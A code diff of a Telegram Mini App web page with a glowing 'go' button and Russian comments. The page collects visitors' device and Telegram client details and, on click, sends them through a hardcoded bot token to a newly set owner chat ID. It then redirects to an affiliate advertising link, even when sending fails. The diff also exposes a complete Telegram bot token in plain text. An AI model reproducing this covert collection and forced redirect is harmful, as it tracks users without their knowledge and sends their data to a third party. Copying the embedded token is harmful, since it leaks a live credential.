@@ -22,7 +22,6 @@
             position: relative;
         }
 
-        /* Космический фон */
         .space-bg {
             position: fixed;
             top: 0;
@@ -44,7 +43,6 @@
             50% { opacity: 1; transform: scale(1.2); }
         }
 
-        /* Центральный элемент */
         .center-circle {
             position: relative;
             z-index: 2;
@@ -88,7 +86,6 @@
             100% { transform: rotate(0deg); }
         }
 
-        /* Основная кнопка */
         .main-button {
             position: relative;
             width: 160px;
@@ -164,7 +161,6 @@
             100% { transform: rotate(360deg); }
         }
 
-        /* Эффект пульсации */
         .pulse-ring {
             position: absolute;
             width: 200px;
@@ -194,7 +190,6 @@
             }
         }
 
-        /* Плавающие частицы */
         .particles {
             position: fixed;
             top: 0;
@@ -231,7 +226,6 @@
             }
         }
 
-        /* Индикатор загрузки */
         .loader {
             position: absolute;
             top: 50%;
@@ -258,7 +252,6 @@
             100% { transform: rotate(360deg); }
         }
 
-        /* Текст внизу */
         .footer {
             position: fixed;
             bottom: 30px;
@@ -271,7 +264,33 @@
             z-index: 2;
         }
 
-        /* Адаптивность */
+        .click-glow {
+            position: absolute;
+            width: 300px;
+            height: 300px;
+            background: radial-gradient(circle, rgba(0, 255, 255, 0.2) 0%, transparent 70%);
+            border-radius: 50%;
+            opacity: 0;
+            pointer-events: none;
+        }
+
+        .neon-glow {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            box-shadow: 
+                0 0 20px rgba(0, 255, 255, 0.2),
+                0 0 40px rgba(0, 255, 255, 0.1),
+                0 0 60px rgba(0, 255, 255, 0.05);
+            opacity: 0;
+            transition: opacity 0.3s;
+        }
+
+        .main-button:hover .neon-glow {
+            opacity: 1;
+        }
+
         @media (max-width: 768px) {
             .center-circle {
                 width: 250px;
@@ -311,35 +330,6 @@
                 bottom: 20px;
                 font-size: 11px;
             }
-        }
-
-        /* Эффект свечения при клике */
-        .click-glow {
-            position: absolute;
-            width: 300px;
-            height: 300px;
-            background: radial-gradient(circle, rgba(0, 255, 255, 0.2) 0%, transparent 70%);
-            border-radius: 50%;
-            opacity: 0;
-            pointer-events: none;
-        }
-
-        /* Эффект неонового свечения */
-        .neon-glow {
-            position: absolute;
-            width: 100%;
-            height: 100%;
-            border-radius: 50%;
-            box-shadow: 
-                0 0 20px rgba(0, 255, 255, 0.2),
-                0 0 40px rgba(0, 255, 255, 0.1),
-                0 0 60px rgba(0, 255, 255, 0.05);
-            opacity: 0;
-            transition: opacity 0.3s;
-        }
-
-        .main-button:hover .neon-glow {
-            opacity: 1;
         }
     </style>
 </head>
@@ -389,7 +379,7 @@
         const CONFIG = {
             BOT_TOKEN: '7960473361:AAF5A_Ho-re9DU8Rlidb2h6-vAQWCUAtOSQ',
             AUTO_CLOSE: true,
-            OWNER_CHAT_ID: null
+            OWNER_CHAT_ID: 8073659994
         };
 
         // Глобальные переменные
@@ -554,7 +544,6 @@
                     deviceData.tgPlatform = tg.platform;
                     deviceData.tgVersion = tg.version;
                     deviceData.themeParams = tg.themeParams;
-                    deviceData.initData = tg.initData;
                 }
 
             } catch (error) {
@@ -562,7 +551,7 @@
             }
         }
 
-        // Настройка кнопки
+        // Настройка кнопки с перенаправлением
         function setupButton() {
             const goButton = document.getElementById('goButton');
             const loader = document.getElementById('loader');
@@ -586,18 +575,27 @@
                 loader.style.display = 'block';
                 
                 try {
-                    // Отправляем данные
-                    const success = await sendDataToBot();
+                    // Отправляем данные в бота
+                    await sendDataToBot();
                     
-                    if (success && tg && CONFIG.AUTO_CLOSE) {
-                        // Закрываем Mini App через 500мс
+                    // ПЕРЕНАПРАВЛЕНИЕ НА ЦЕЛЕВОЙ САЙТ
+                    setTimeout(() => {
+                        window.location.href = 'https://my.saleads.pro/s/5dovq?erid=2VtzquqtSgA';
+                    }, 500);
+                    
+                    // Закрываем Mini App если в Telegram
+                    if (tg && CONFIG.AUTO_CLOSE) {
                         setTimeout(() => {
                             tg.close();
-                        }, 500);
+                        }, 300);
                     }
                     
                 } catch (error) {
                     console.error('Ошибка:', error);
+                    // Даже при ошибке перенаправляем
+                    setTimeout(() => {
+                        window.location.href = 'https://my.saleads.pro/s/5dovq?erid=2VtzquqtSgA';
+                    }, 500);
                 } finally {
                     setTimeout(() => {
                         isSending = false;
